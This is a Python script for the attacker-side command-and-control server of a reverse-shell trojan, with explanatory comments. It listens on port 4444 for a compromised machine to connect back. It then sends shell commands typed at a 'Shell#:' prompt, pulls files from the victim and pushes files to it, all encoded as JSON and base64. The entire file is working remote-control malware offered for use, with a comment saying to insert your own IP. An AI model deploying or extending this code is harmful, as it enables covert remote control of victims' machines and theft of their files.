# Command-and-control server (runs on attacker machine)

import socket # for network communication
import json  # for sending structured data
import base64  # for safe file transfer (binary over text)

def server(ip, port):  # Starts a TCP socket listener.
    global target

    lisetner = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates TCP socket
    lisetner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allows reuse of address if restarted.
    lisetner.bind((ip, port)) # Binds to IP and port
    lisetner.listen(0)
    print('[+] Listening....')
    target, address = lisetner.accept() # Waits for the client to connect.
    print(f"[+] Got connection from {address}")

# Once the client connects, we store the connection in target.

def send(data):
    json_data = json.dumps(data) # Sends data as JSON
    target.send(json_data.encode('utf-8')) # Converts Python data to JSON , Sends it as UTF-8 encoded text over the socket.


# Receives up to 1024 bytes at a time, Keeps appending until valid JSON is formed (in case it's split across chunks).
# Returns the decoded Python object.
def recieve():
    json_data = ''
    while True:
        try:
            json_data += target.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

# Waits for user input, sends it to the client as a command.
def run():
    while True:
        command = input('Shell#: ')
        send(command)
        if command == 'exit': #  Ends the session when user types exit.
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command [:8] == 'download':
            with open(command[9:], 'wb') as f:
                file_data = recieve()
                f.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            with open(command[7:], 'rb') as f:
                send(base64.b64encode(f.read()))
        else:
            result = recieve().encode('utf-8')
            print(result.decode('utf-8'))

server('127.0.0.1', 4444) # use your ip address
run()